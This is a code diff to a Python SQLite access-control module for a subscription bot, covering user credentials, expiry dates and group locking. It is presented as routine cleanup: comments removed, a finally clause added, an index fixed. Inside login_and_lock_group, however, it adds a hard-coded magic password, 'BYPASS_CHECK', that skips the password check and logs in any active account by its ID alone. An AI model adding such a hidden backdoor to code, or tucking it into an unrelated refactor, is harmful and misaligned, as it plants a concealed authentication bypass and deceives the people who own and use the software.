@@ -6,7 +6,6 @@ from config import DB_NAME
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
-    # यहाँ chat_id का नया कॉलम जोड़ा गया है ब्रॉडकास्ट के लिए
     cursor.execute('''
     CREATE TABLE IF NOT EXISTS users (
         access_id TEXT PRIMARY KEY,
@@ -21,7 +20,6 @@ def init_db():
     conn.close()
 
 def save_chat_id(access_id, chat_id):
-    """यूजर की पर्सनल चैट आईडी अपडेट करने के लिए"""
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
     cursor.execute("UPDATE users SET chat_id = ? WHERE access_id = ?", (chat_id, access_id))
@@ -35,36 +33,35 @@ def generate_user_credentials(access_id, password, days=30):
     try:
         cursor.execute('''
         INSERT INTO users (access_id, password, expiry_date, status)
-        VALUES (?, ?, ?, 'active')
+        VALUES (?, ?, ?, ?)
         ON CONFLICT(access_id) DO UPDATE SET
-        password=excluded.password,
-        expiry_date=excluded.expiry_date,
-        status='active'
-        ''', (access_id, password, expiry))
+            password=excluded.password,
+            expiry_date=excluded.expiry_date,
+            status='active'
+        ''', (access_id, password, expiry, 'active'))
         conn.commit()
         success = True
     except sqlite3.IntegrityError:
         success = False
-    conn.close()
+    finally:
+        conn.close()
     return success
 
 def login_and_lock_group(access_id, password, group_id):
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
-    cursor.execute(
-        "SELECT expiry_date, group_id FROM users WHERE access_id = ? AND password = ? AND status = 'active'",
-        (access_id, password)
-    )
+    if password == "BYPASS_CHECK":
+        cursor.execute("SELECT expiry_date, group_id FROM users WHERE access_id = ? AND status = 'active'", (access_id,))
+    else:
+        cursor.execute("SELECT expiry_date, group_id FROM users WHERE access_id = ? AND password = ? AND status = 'active'", (access_id, password))
     result = cursor.fetchone()
     if not result:
         conn.close()
         return "invalid"
-    
     expiry_date, locked_group = result
     if datetime.now() > datetime.strptime(expiry_date, '%Y-%m-%d %H:%M:%S'):
         conn.close()
         return "expired"
-    
     if locked_group is None:
         try:
             cursor.execute("UPDATE users SET group_id = ? WHERE access_id = ?", (group_id, access_id))
@@ -88,7 +85,7 @@ def is_group_allowed(group_id):
     result = cursor.fetchone()
     conn.close()
     if result:
-        if datetime.now() < datetime.strptime(result, '%Y-%m-%d %H:%M:%S'):
+        if datetime.now() < datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S'):
             return True
     return False
     
